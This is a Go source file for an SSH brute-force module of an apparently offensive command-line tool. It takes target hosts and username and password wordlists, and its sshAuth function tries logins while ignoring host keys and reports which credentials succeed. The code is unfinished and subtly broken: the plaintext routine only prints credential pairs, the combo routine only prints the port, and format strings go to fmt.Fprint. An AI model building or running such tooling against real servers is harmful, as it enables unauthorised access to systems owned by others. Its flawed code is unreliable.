//	Name: SSH Module
//	Usage: Used for bruteforcing SSH services
//  Credits: github.com/aldenso/sshgobrute
//	Author: dru1d

package main

import (
	"log"
	"fmt"
	"errors"
	"sync"
	"time"
	"os"
	"bufio"
	"golang.org/x/crypto/ssh"
	"github.com/fatih/color"
	"github.com/urfave/cli"
)

var (
inittime = time.Now()
sshSubcommands = []cli.Command{
		{
			Name:   "combo",
			Usage:  "uses combo file to guess credential",
			Action: sshCombo,
			Flags: []cli.Flag {
				cli.StringFlag {
					Name:  "file, f",
					Usage: "run combo file attack",
				},
				cli.StringFlag {
					Name: "host",
					Usage: "insert for combo attack",
				},
				cli.StringFlag {
					Name:  "port",
					Usage: "port for combo attack",
					Value: "22",
					},
				cli.StringFlag {
					Name: "hostfile, H",
					Usage: "insert host file for combo attack",
				},
				cli.IntFlag {
					Name: "timeout, t",
					Usage: "set timeout for ssh connection; default 300ms",
					Value: 300,
				},
			},
		},
		{
			Name:	"plaintext",
			Usage:	"uses plaintext credentials to bruteforce",
			Action:	sshPlaintext,
			Flags:	[]cli.Flag {
				cli.StringFlag {
					Name:  "host",
					Usage: "host for bruteforce",
					},
				cli.StringFlag {
					Name:  "hostfile, H",
					Usage: "Insert host files for bruteforce",
					},
				cli.StringFlag {
					Name:	"port",
					Usage:	"Port for bruteforce",
					Value:	"22",
					},
				cli.StringFlag {
					Name:	"user, u",
					Usage:	"User for bruteforce",
					},
				cli.StringFlag {
					Name:	"userfile, U",
					Usage:	"User file for bruteforce",
					},
				cli.StringFlag {
					Name:	"password, p",
					Usage:	"Password for bruteforce",
					},
				cli.StringFlag {
					Name:	"passfile, P",
					Usage:	"Password file for bruteforce",
					},
				cli.IntFlag {
					Name: "timeout,t",
					Usage: "Set timeout for SSH connection; default 300ms",
					Value: 300,
					},
				},
			},
	}

sshBrute = cli.Command {
			Name:		 "ssh",
			Usage:		 "bruteforces SSH services",
			Subcommands: sshSubcommands,
		}
)

type resp struct {
	Error error
	mu sync.Mutex
}

type fileScanner struct {
	File	*os.File
	Scanner *bufio.Scanner
}


func newFileScanner() *fileScanner {
	return &fileScanner {}
}


func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}


func (f *fileScanner) Close () error {
	return f.File.Close()
}


func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}
	return f.Scanner
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func sshAuth(username string, password string, host string, port string, timer int) *resp {
	respond := &resp{}
	clientConf := &ssh.ClientConfig {
		User:				username,
		HostKeyCallback:	ssh.InsecureIgnoreHostKey(),
		Auth:				[]ssh.AuthMethod{ssh.Password(password)},
		Timeout:			time.Duration(timer)*time.Millisecond,
	}
	_, err := ssh.Dial("tcp", host+":"+ port, clientConf)
	if err != nil {
		fmt.Fprint(color.Output, "\nUser: %s Password: %s [%s]", username, password, color.RedString("FAILED"))
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Fprint(color.Output, "\n[%s] User: %s Password: %s [%s] [%v]", end, username, password, color.GreenString("SUCCESS"), duration)
	}
	respond.Error = err
	return respond
}

func sshCombo(c *cli.Context) error {
	if c.Args().First() == "" {
		return errors.New("must supply a combo file to this command")
	}
	fmt.Println(c.String("port"))
	return nil
}

func sshPlaintext(c *cli.Context) error {
	if c.String("userfile") != "" {
		users, err := readLines(c.String("userfile"))
		if err != nil {
			log.Fatalf("readLines: %s", err)
		}
		for user := range users {
			passwords, err := readLines(c.String("passfile"))
			if err != nil {
				log.Fatalf("readLines: %s", err)
			}
			for password := range passwords {
				fmt.Println(users[user], passwords[password] )
			}
		}
	}
	return nil
}
